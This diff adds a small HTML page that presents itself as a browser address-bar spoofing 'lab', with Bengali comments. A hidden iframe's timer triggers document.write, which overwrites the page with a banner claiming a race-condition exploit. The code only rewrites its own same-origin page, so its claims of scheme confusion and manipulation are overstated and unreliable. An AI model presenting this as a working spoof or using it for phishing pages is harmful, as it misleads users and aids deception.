@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Self-Origin Omni-Spoof Lab</title>
+</head>
+<body>
+    <h1>Iframe-Triggered Thread Hijack</h1>
+    <button onclick="executeIframeFreeze()">Run Self-Spoof</button>
+
+    <script>
+    function executeIframeFreeze() {
+        // ১. কারেন্ট পেইজেই একটি ডাইনামিক হিডেন আইফ্রেম তৈরি করা
+        let spoofIframe = document.createElement('iframe');
+        spoofIframe.style.display = 'none';
+        document.body.appendChild(spoofIframe);
+
+        // ২. আইফ্রেমের সোর্সকে একটি রেস-কন্ডিশন স্টেট বা ব্ল্যাঙ্ক স্কিমে পাঠানো
+        spoofIframe.src = "about:blank";
+
+        // ৩. আইফ্রেমের ইন্টারনাল থ্রেড যখন রেন্ডারারকে নক করবে, তখন সিঙ্ক্রোনাসলি মেইন উইন্ডো ওভাররাইট করা
+        spoofIframe.contentWindow.setTimeout(() => {
+            try {
+                // মেইন উইন্ডোর DOM মেমোরি ফ্লাশ করা কিন্তু কোনো নতুন ডোমেইনে নেভিগেট না করা
+                // এটি অ্যাড্রেস বারকে কারেন্ট হোস্টেড সাইটেই স্থির রাখবে
+                window.stop();
+                
+                document.open();
+                document.write(`
+                    <html>
+                    <body style="background:black; color:lime; font-family:monospace; padding:50px;">
+                        <h2>[+] Self-Origin Race Condition Triggered</h2>
+                        <p>Omnibar stays on current host, but underlying layer is completely manipulated via Iframe scheme confusion.</p>
+                    </body>
+                    </html>
+                `);
+                document.close();
+            } catch(e) {
+                console.log("Iframe protection boundary hit: " + e.message);
+            }
+        }, 5); 
+    }
+    </script>
+</body>
+</html>
